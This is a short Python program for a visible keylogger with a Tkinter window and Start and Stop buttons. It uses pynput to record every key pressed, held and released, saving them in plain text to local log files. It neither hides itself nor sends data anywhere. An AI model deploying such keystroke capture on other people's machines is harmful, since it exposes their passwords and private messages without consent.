import tkinter as tk
from tkinter import ttk
from tkinter import *
from pynput import keyboard
import json

keys_used = []
flag = False
keys = ""

def generate_text_log(key):
    try:
        with open('key_log.txt', "w+") as keys_file:
            keys_file.write(key)
    except Exception as e:
        print(f"Error writing to text log: {e}")

def generate_json_file(keys_used):
    try:
        with open('key_log.json', 'w') as key_log:
            json.dump(keys_used, key_log, indent=4)
    except Exception as e:
        print(f"Error writing to JSON log: {e}")

def on_press(key):
    global flag, keys_used, keys
    try:
        if flag == False:
            keys_used.append({'Pressed': f'{key}'})
            flag = True
        
        if flag == True:
            keys_used.append({'Held': f'{key}'})
        generate_json_file(keys_used)
    except Exception as e:
        print(f"Error on key press: {e}")

def on_release(key):
    global flag, keys_used, keys
    try:
        keys_used.append({'Released': f'{key}'})
        if flag == True:
            flag = False
        generate_json_file(keys_used)
        keys = keys + str(key)
        generate_text_log(str(keys))
    except Exception as e:
        print(f"Error on key release: {e}")

def start_keylogger():
    global listener
    try:
        listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        listener.start()
        label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.txt'")
        start_button.state(['disabled'])
        stop_button.state(['!disabled'])
    except Exception as e:
        print(f"Error starting keylogger: {e}")

def stop_keylogger():
    global listener
    try:
        listener.stop()
        label.config(text="Keylogger stopped.")
        start_button.state(['!disabled'])
        stop_button.state(['disabled'])
    except Exception as e:
        print(f"Error stopping keylogger: {e}")

root = Tk()
root.title("Keylogger")
root.geometry("300x150")

style = ttk.Style()
style.configure("TButton", font=('Arial', 10))
style.configure("Start.TButton", foreground='green', background='green')
style.map("Start.TButton", background=[('disabled', 'grey')])
style.configure("Stop.TButton", foreground='red', background='red')
style.map("Stop.TButton", background=[('disabled', 'grey')])

label = Label(root, text='Click START to begin keylogging.')
label.config(anchor=CENTER)
label.pack()

start_button = ttk.Button(root, text="Start", style="Start.TButton", command=start_keylogger, width=10)
start_button.pack(pady=10)

stop_button = ttk.Button(root, text="Stop", style="Stop.TButton", command=stop_keylogger, state='disabled', width=10)
stop_button.pack(pady=10)

root.mainloop()
